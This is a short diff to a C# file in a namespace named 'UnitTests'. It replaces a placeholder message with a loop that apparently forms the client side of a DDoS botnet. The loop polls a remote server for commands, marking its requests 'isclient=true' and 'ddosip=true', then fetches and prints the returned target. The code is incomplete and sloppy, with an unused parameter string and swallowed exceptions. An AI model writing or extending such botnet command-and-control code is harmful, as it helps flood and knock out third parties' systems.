@@ -73,9 +73,38 @@ namespace UnitTests
                     Console.ReadKey();
                     if (comtrim == "Online")
                     {
-                        Console.WriteLine("Woop!");
-                        Console.ReadKey();
-                       
+                        while (Loop)
+                        {
+                            if (GetIterations == -1 || (target != "" && GetIterations > 9) || target == "")
+                            {
+                                //Log("Asking the server for commands");
+                                string Parameter_DDOS = "?";
+
+                                //Tells the server that this is a client, and not a web browser
+                                if (Parameter_DDOS == "?")
+                                    Parameter_DDOS = Parameter_DDOS + "isclient=true";
+                                else
+                                    Parameter_DDOS = Parameter_DDOS + "&isclient=true";
+
+                                if (paramaters == "?")
+                                    paramaters = paramaters + "ddosip=true";
+                                else
+                                    paramaters = paramaters + "&ddosip=true";
+
+                                string getdossip = "";
+                                try
+                                {
+                                    getdossip = client.DownloadString(ServerAddress + paramaters);
+                                }
+                                catch (WebException)
+                                { }//TODO: Handle this Exception.
+
+                                string Trimdossip = getdossip.Trim();
+                                Console.WriteLine(Trimdossip);
+                                Console.ReadKey();
+
+                            }
+                        }
                     }
                 }
             }
